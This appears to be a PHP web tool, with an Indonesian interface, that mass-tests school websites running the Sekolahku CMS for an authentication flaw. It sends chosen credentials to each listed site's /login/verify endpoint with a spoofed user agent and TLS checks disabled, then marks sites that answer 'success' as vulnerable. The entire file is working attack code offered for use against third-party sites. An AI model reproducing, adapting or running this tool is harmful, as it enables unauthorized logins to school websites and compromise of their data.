<html>
<head>
<title>[+] Mass CMS Sekolahku [+]</title>
<meta name="viewport" content="width=device-width, initial-scale=1" /> 
</head>
<script src="https://cdn.jsdelivr.net/npm/pace-js@latest/pace.min.js"></script>
<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/pace-js@latest/pace-theme-default.min.css">
<body bgcolor="#1e1e1e" text="white" style="max-width: 100%">
<style>
  @import url('https://fonts.googleapis.com/css?family=Staatliches');


textarea {
max-width: 90%;
width: 90%;
height: 150px;
resize: none;
outline: none;
overflow: auto;
background: transparent;
color: #ffffff;
}

textarea#note {
  width:100%;
    resize: none;
  display:block;
  max-width:100%;
  border: none;
    outline: none;
}

button {
  background: transparent;
    font-family: Staatliches;
  color: #ffffff;
  border-color: #ffffff;
  cursor: pointer;
}

input {
  background: transparent;
  font-family: Staatliches;
  color: #ffffff;
  border-color: #ffffff;
  cursor: pointer;
  max-width: 95%;
}

font {
  font-family: Staatliches;
}

body::-webkit-scrollbar {
  width: 12px;               /* width of the entire scrollbar */
}

body::-webkit-scrollbar-track {
  background: ##1e1e1e;        /* color of the tracking area */
}

body::-webkit-scrollbar-thumb {
  background-color: ##1e1e1e;    /* color of the scroll thumb */
  border: 3px solid gray;  /* creates padding around scroll thumb */
}

.area {
  font-family: Courier;
}

nemu {
  color: green;
}

kgk {
  color: red;
}

error {
	color: yellow;
}
</style>
<body>
<center>
<font face=courier new size=5>Mass CMS Sekolahku<br><font size="3">Login CMS dengan user pass sendiri secara instan</font><small>note : tools bisa saja salah karena versi cms yang berbeda beda</small><font size="3"><hr>
<form method="post">
<textarea rows=1 name="url" placeholder="https://exploits.my.id/" required="true"></textarea><br><br>
<input type="text" name="user" placeholder="Username" class="area" required="required"><br>
<input type="text" name="pass" placeholder="Password" class="area" required="required"><br><br>
<input type="submit" name="go" value="Gaskan">
</form>
<?php
if (isset($_POST['go'])) {

	echo "<hr><pre style='text-align: left; white-space: pre-line;'>";
	if (empty($_POST['url'])) {
		die("Hayo lo mau ngapain ? wkwk");
	} else {
		$list = explode("\r\n", $_POST['url']);
		if (count($list) > 20) {
			die("List web tidak boleh lebih dari 20 !");
		}
	}
	echo "[+] Loading ... ( ".count($list)." sites )<br><br>";
	$user = $_POST['user'];
	$pass = $_POST['pass'];
	echo "user : ".htmlspecialchars($user)."<br>";
	echo "pass : ".htmlspecialchars($pass)."<br><br>";

	foreach ($list as $web) {
		ob_implicit_flush();ob_end_flush();
		if (strpos($web, "http") !== false) {
		} else {
			echo "[<error>Error</error>] Awalan Website Harus http ! <i>".$web."</i><br>";
			continue;
		}
		$web = $web."/login/verify";
		$web = str_replace("///", "/", $web);
		$web = str_replace("//", "/", $web);
		$web = str_replace("https:/", "https://", $web);
		$web = str_replace("http:/", "http://", $web);
		$hasil = htmlspecialchars(str_replace("login/verify", "", $web));
		$ch = curl_init();
		curl_setopt($ch, CURLOPT_URL, $web);
		curl_setopt($ch, CURLOPT_POST, 1);
		curl_setopt($ch, CURLOPT_POSTFIELDS, "user_name=".$user."&user_password=".$pass);
		curl_setopt($ch, CURLOPT_HTTPHEADER, array("X-Requested-With: XMLHttpRequest"));
		curl_setopt($ch, CURLOPT_USERAGENT, "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.131 Safari/537.36");
		curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
		curl_setopt($ch, CURLOPT_CONNECTTIMEOUT, 30); 
		curl_setopt($ch, CURLOPT_IPRESOLVE, CURL_IPRESOLVE_V4);
		curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
		curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
		$ekse = curl_exec($ch);
		if (curl_errno($ch)) {
			echo "[<error>Error</error>] ".$hasil."<br>";
		} elseif (strpos($ekse, "success") !== false) {
			echo "[<nemu>Vuln</nemu>] ".$hasil."<br>";
		} else {
			echo "[<kgk>Not Vuln</kgk>] ".$hasil."<br>";
		}
		curl_close($ch);
	}
	echo "<br>[~] Done </pre>";
}
?>
<hr><font face="courier" size="3">Unknown45 - 2021</font>